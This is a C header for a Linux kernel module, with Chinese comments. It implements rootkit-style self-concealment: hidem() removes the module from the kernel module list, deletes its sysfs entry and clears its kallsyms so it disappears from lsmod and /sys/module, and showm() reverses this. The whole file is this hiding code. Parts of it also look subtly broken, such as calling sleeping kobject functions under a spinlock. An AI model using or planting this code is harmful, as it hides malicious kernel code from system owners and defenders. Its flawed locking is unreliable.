#ifndef _HIDE_H_
#define _HIDE_H_

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/spinlock.h>

/* 保护模块自身隐藏操作的锁 */
static DEFINE_SPINLOCK(hide_lock);
static int is_hidden = 0;

/* 保存原始链表、kobject、kallsyms 等 */
static struct list_head original_list;
static struct kobject *original_kobj;
static struct kobject *original_parent;
static struct mod_kallsyms *original_kallsyms;

static inline void hidem(void)
{
	unsigned long flags;

	spin_lock_irqsave(&hide_lock, flags);
	if (is_hidden) {
		spin_unlock_irqrestore(&hide_lock, flags);
		return;
	}

	/* 记录并移除内核模块链表 */
	original_list = THIS_MODULE->list;
	list_del_init(&THIS_MODULE->list);

	/* 移除 sysfs 下的 kobject */
	original_kobj = &THIS_MODULE->mkobj.kobj;
	original_parent = original_kobj->parent;
	kobject_del(original_kobj);

	/* 清空 kallsyms，隐藏导出的符号 */
	original_kallsyms = THIS_MODULE->kallsyms;
	THIS_MODULE->kallsyms = NULL;

	is_hidden = 1;
	spin_unlock_irqrestore(&hide_lock, flags);
}

static inline void showm(void)
{
	int ret;
	unsigned long flags;

	spin_lock_irqsave(&hide_lock, flags);
	if (!is_hidden) {
		spin_unlock_irqrestore(&hide_lock, flags);
		return;
	}

	/* 恢复链表 */
	list_add(&THIS_MODULE->list, original_list.prev);

	/* 恢复 sysfs 条目 */
	ret = kobject_add(original_kobj, original_parent, "%s", THIS_MODULE->name);
	if (ret)
		pr_err("hide: kobject_add failed: %d\n", ret);

	/* 恢复 kallsyms */
	THIS_MODULE->kallsyms = original_kallsyms;

	is_hidden = 0;
	spin_unlock_irqrestore(&hide_lock, flags);
}

#endif /* _HIDE_H_ */